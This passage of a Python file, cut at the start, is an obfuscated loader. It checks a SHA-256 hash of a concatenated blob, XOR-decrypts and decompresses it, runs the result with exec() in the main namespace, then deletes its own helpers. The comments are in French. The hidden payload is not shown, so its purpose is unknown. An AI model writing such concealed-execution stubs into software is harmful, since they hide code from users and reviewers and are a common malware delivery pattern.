_csGb8gPKZcNtNU + _cqna2hZmJPa7ZN + _chGMwxcoZF5s14 + _czY8yDnSxe00O3 + _crjvzfXlpQwkyO + _cmrZ5JMhNFzBWD + _cb0zhLstzI7qwE + _cg75QkuXVbtggW + _cubo8n3EL9z__w + _cgp9RZzNAujK1V + _cmu8qrs9acztE5 + _cogE0mVFLLBFuE + _cfoOSbn4pol7nG + _coLX6DBaT4YyNd + _cpGz5jIBLm47kG + _cohYqdsamZ0t9W + _cazFypVm0OZuaI + _ca_Jeu8vIH7UlL + _cu5ZubYQth2g8P + _cn0DbhJm_woaji + _cdvr5FnvSSn4Rq + _cgNtKnM7qMxvom + _ckZqP2e537fJrp + _c_gPkP5gUxkOtm + _c_pxCXHcqHCCED + _cchRtG6j7A1DiK + _crMQG99sdpZrKl + _csLxlGc4KheIMO + _ctAUQk8OzCpFMk + _cwRgLrBe2IVBoe + _cwUroOAmmYnW3E + _cnmYUap1auS9wo + _c_KNLWbuwRBNWk + _coeqt9RtMXvPCb + _cda41Ucq10kWgH + _cpnoZ0KUZG_8U5 + _cvGlPr02CWprTz + _cnyP75YmK8a7_q + _cfF3XemPQKH75M + _ciwIpWp2y04rFe + _caImpH3WMHiuIG + _clcnId38fGPH_y + _ca7QyG0qzCrwM0 + _csEEp5B9oTBj9f + _cuphYgCS_rdzHd + _cdeyHPtSNDs3h3 + _cgrVuvX7FJA2zV + _ctinPzanBgBvaP + _cj5rkQNGEsRglc + _cbV__yE037fNcr + _c_iMZYDago4LE6 + _cxvQEAQKoy2xXt + _cbdRHNg3oIVVuF + _cz9gwsbO2_XlX_ + _clF86TROYiIyj8 + _coqeaRXPpxgsAa + _ciOoVGtNGPAzL7 + _cz3gnHm1ORQRl9 + _cduJWmMLZ5vQQ_ + _cnCqa38_BW4OYp + _cweh5srKQOSODp + _cpoPdQ1bfedJNU + _cxjfUg2edTODcC + _cmy5yP7a7xvvzY + _cwla2EtCDYmj4H + _cjURJiWoD0E05k + _ceznDWBV42SR5D + _capp0Q5k60TCR7 + _crCP1qTPfMkqTj + _cknJUqZ3z_iric + _cykaghX153OPHX + _cehwVp0EN11PTw + _caiCxUL0mdIkzK + _cnLBahxZK34UmC + _cfnW1SYiBFcCqq + _ciCW0YIzpI8le7 + _crAX5aFGX2b0Ib + _ctpG6WWEic37LM + _cga4yAhAxq1Ek3 + _cfY9h7VU0pEtTm + _cgX20HtNUTk0_S + _cd5MZYuhleFKFb + _chKDZfN5FptqoZ + _csklWSCG6vEiYd + _cxnh_57MVwkaXq + _cnYlrjKZL6x3gY + _c_RP6qPaxhT1Bd + _cgEPy98HVMLa1t + _cfT9lJDvVu_3u6 + _cebpzLAEyRI5Es + _cr5Dk7ndJ77nyI + _cwYdmWPfYeuiv6 + _coNKviyG0khTGc + _cfoyqg2oSw58kZ + _cwSPev0iOXuTms + _cgtcLlNjJ1lkl5 + _caOUe_wl2N0TxA + _cqd_8mmVTaDZ7w + _ceMpU1gIdXG3KO + _cxj5HmCMw10pt8 + _ctCvL5o1XrIXdH + _cdqDhjO5zWftX1 + _ceCGu7UHm7d3eI + _ciTS6iewDcIqA9 + _cg_I4se03qs6XL + _cv6UWQ_TduY7R_ + _chMXjSDuKD3YxX + _ctIzBKKVC3VbvY + _c_oY5REaY66YLw + _cxRvZctPUNSgIB + _czUcRnubn7qOHW + _cbqtxbHirqSHlq + _c_R2V_z4c3_WWE + _cjNY_cbqGkI8yS + _ciivcpoLzRJILG + _cwr3NpNP4ifTGY + _cxnaePpxSsTcqz + _cb25ExOv_JrYuZ + _cxsu8cp3DZc9Ip + _ccSo9e9uw_bkCH + _cvjFncZAVIbhQR + _cz5PlzSwL88tum + _crIRAcBNTzXr1Q + _cu6sImaM3jemdw + _cxv_Quei6T9_kt + _cspbDlThD4TTKS + _c_xshaWrqBEeJW + _cjUV5g3TXe2ttK + _caYCmrFjZnQDjD + _crSwH7VICAdu_q + _cm8fw7rq0liEL2 + _ctTXn1ZLhOeX9g + _cohoYr1_wPhOLz + _ccKSR1i1rFy_kb + _cvsN0J_BIlqUok + _caJgAUzfv2HcEX + _ci_bmVKYv_5yei + _cuhfEc6WimNJxa + _cbYlS1U6CYAY30 + _cxzdaoV0Fs_3b2 + _cnX3uodD97R8wX + _clX3HC9XusxNMj + _cwtWFhCiL972hG + _cgwE6xjAbKtklX + _caHhre9PRuxaOZ + _cyJ4tCKRG4zpwd + _cb897dwHSzB6IS + _ck0ntiK9zfBtJu + _cj8VgLg6i2jazf + _czbfPMYwtYSrwQ + _csv7aKb3iSiUsl + _cvU0fakWLx1RKt + _cgwAkYCzWmOcfU + _cmyHQRHaa0BnQl + _cf7F5t5E64XFke + _cfdLXwIkl620Wa + _ciDP68PCJBM8oN + _cuEZFEj9uuqCfp + _creFPQ7fUgDEux + _ct8xl8WBbpH2mq + _cl5GJY5YhKB4tT + _cpm88Q2YhaGoUb + _ci4yfrrlI5RsyO + _coFGtzUzh5m4pe + _cbCj3B4NoAKiNy + _colpvY9AAp_R6c + _cuK3Kno69o7Hvg + _chZeoDdtS64F2k + _c_tJPnlSOBkkjY + _coEmNIX6DOtqRq + _czjqXbsdLd3m0V + _cjnbtYwahTqU2w + _clireSBw7Io1DS + _clXcl6PSoEV1Q6 + _caNYJ4wN5qkkCp + _c_9U4kDHDp0NKZ + _ccnStgaWRJBC0c + _cidyPfvZ54bPZr + _csKqTcimWG1u5h + _ctRDZ0YqKDwUCK + _cklVWwKOu3iTMW + _chz3j0jaz0mJgh)
if __import__('hashlib').sha256(_pmDwi_LZQRNLZF).hexdigest() != 'b9445d018cd7a48124d97b6c01d320935a964149a52cfba0298a59832c09aa69':
    __import__('sys').exit(1)
_xhzysyUgxXpEa8 = bytes([84, 207, 191, 81, 247, 4, 84, 126, 166, 48, 233, 216, 239, 2, 248, 238, 183, 50, 176, 102, 220, 15, 199, 233, 8, 2, 225, 79, 22, 206, 98])
_fklFh4cb1DWHDQ_ = bytes([147, 219, 239, 116, 76, 146, 55, 207, 206, 201, 147, 101, 225, 176, 68, 66, 66, 63, 97, 71, 101, 71, 109, 118, 37, 93, 148, 142, 201, 226, 23])

def _fxzx9lHTVWYTPRI(_bvnri9o88cWf5l, _kxNkJ_wMmQyLBF):
    return bytes(_bvnri9o88cWf5l[_ilnA4S1FNB6aTx] ^ _kxNkJ_wMmQyLBF[_ilnA4S1FNB6aTx % len(_kxNkJ_wMmQyLBF)] for _ilnA4S1FNB6aTx in range(len(_bvnri9o88cWf5l)))

def _fdgiTAKmA2p3qIq(_trLXKQMZxFwbVJ):
    import zlib
    return zlib.decompress(_trLXKQMZxFwbVJ) # Un seul niveau de zlib ici pour simplifier

def _fevJAUe9IKacdM4():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xibUnByOV56Sj8 = _fxzx9lHTVWYTPRI(_pmDwi_LZQRNLZF, _xhzysyUgxXpEa8)
    # 2. Décompression Zlib
    _d_DqEKOa2KC9XA = _fdgiTAKmA2p3qIq(_xibUnByOV56Sj8)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _d_DqEKOa2KC9XA.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nfdJv86PGyMCas = _main.__dict__
    _nfdJv86PGyMCas.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nfdJv86PGyMCas)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fevJAUe9IKacdM4()
try:
    del _fxzx9lHTVWYTPRI, _fdgiTAKmA2p3qIq, _fevJAUe9IKacdM4
    del _pmDwi_LZQRNLZF, _xhzysyUgxXpEa8, _fklFh4cb1DWHDQ_
except:
    pass
